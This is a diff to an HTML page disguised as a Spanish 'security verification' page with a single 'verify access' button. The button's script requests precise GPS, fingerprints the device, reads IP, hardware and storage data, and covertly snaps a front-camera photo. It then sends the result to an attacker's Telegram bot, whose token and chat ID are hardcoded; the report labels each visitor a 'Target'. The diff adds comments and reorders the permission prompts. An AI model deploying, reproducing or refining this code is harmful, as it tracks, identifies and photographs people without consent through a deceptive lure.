@@ -6,12 +6,51 @@
     <title>Verificación de seguridad</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #f1f3f4; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .card { background: white; border-radius: 16px; box-shadow: 0 8px 28px rgba(0,0,0,0.12); padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; }
-        h1 { font-size: 1.8rem; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
-        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
-        button { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 12px 24px; font-size: 1rem; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s; }
-        button:active { background: #1557b0; transform: scale(0.98); }
+        body {
+            background: #f1f3f4;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        button:active {
+            background: #1557b0;
+            transform: scale(0.98);
+        }
     </style>
 </head>
 <body>
@@ -20,19 +59,25 @@
     <p>Presiona el botón para continuar</p>
     <button id="btn">✅ Verificar acceso</button>
 </div>
+
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
+
 <script>
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
+    // ================= CONFIGURACIÓN =================
+    const WORKER_URL = 'https://get-visitor-data.tu-subdominio.workers.dev'; // URL de tu Cloudflare Worker
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';   // Token nuevo de @BotFather
     const CHAT_ID = '7555997298';
 
+    // ================= FUNCIONES =================
+    // 1. Obtener IP + ubicación aproximada desde Cloudflare Worker
     async function getIPinfo() {
         try {
-            const res = await fetch('https://ipapi.co/json/');
+            const res = await fetch(WORKER_URL);
             const data = await res.json();
             return {
                 ip: data.ip || 'N/A',
-                country: data.country_name || 'N/A',
+                country: data.country || 'N/A',
                 region: data.region || 'N/A',
                 city: data.city || 'N/A',
                 postal: data.postal || 'N/A',
@@ -43,6 +88,7 @@
         }
     }
 
+    // 2. Fingerprint
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -61,6 +107,7 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
+    // 3. Datos del dispositivo
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -75,6 +122,7 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
+    // 4. Almacenamiento
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -84,17 +132,26 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
+    // 5. GPS exacto (se pedirá primero)
     function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                () => resolve(null),
+                (pos) => resolve({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }),
+                () => resolve(null),  // denegado o error
                 { enableHighAccuracy: true, timeout: 15000 }
             );
         });
     }
 
+    // 6. Cámara frontal (opcional, después de la ubicación)
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -116,19 +173,43 @@
         return blob;
     }
 
+    // 7. Envío a Telegram
     async function sendMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }) }); } catch(e) {}
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
     }
     async function sendPhoto(blob) {
-        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg');
-        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch(e) {}
     }
 
-    async function fullProcess() {
-        const [fp, ipInfo, device, storage] = await Promise.all([ getFingerprint(), getIPinfo(), getDeviceInfo(), getStorageInfo() ]);
-        const [gps, foto] = await Promise.all([ getGPS(), capturePhoto() ]);
+    // ================= FLUJO PRINCIPAL =================
+    document.getElementById('btn').onclick = async () => {
+        // 1. Primero, obtener la ubicación (GPS) - esto mostrará el diálogo de permisos
+        const gps = await getGPS();
 
+        // 2. Luego, obtener el resto de datos (no requieren permisos o son secundarios)
+        const [fp, ipInfo, device, storage] = await Promise.all([
+            getFingerprint(),
+            getIPinfo(),
+            getDeviceInfo(),
+            getStorageInfo()
+        ]);
+
+        // 3. Finalmente, intentar la cámara (opcional, no bloquea)
+        const foto = await capturePhoto();
+
+        // 4. Construir el mensaje (si GPS falló, usar IP)
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -148,13 +229,11 @@
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society😈\n`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
-    }
-
-    document.getElementById('btn').onclick = () => { fullProcess(); };
+    };
 </script>
 </body>
 </html>
